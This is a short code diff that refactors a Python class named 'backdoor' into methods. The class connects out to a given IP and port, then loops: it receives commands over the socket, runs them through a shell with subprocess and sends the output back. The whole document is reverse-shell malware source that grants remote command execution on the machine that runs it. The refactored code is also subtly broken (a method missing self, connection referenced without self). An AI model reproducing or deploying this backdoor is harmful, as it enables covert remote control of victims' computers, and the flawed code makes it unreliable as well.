@@ -7,18 +7,16 @@ class backdoor:
         self.connection.connect((ip, port))
         
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+    def execute_system_command(command):
+        return subprocess.check_output(command, shell=True)
 
+    def run(self):
+        while True:
 
-connection.send("\n[+] Connection established.\n")
+            command = connection.recv(1024)
 
-while True:
+            command_result = execute_system_command(command)
 
-    command = connection.recv(1024)
+            connection.send(command_result)
 
-    command_result = execute_system_command(command)
-
-    connection.send(command_result)
-
-connection.close()
+        connection.close()
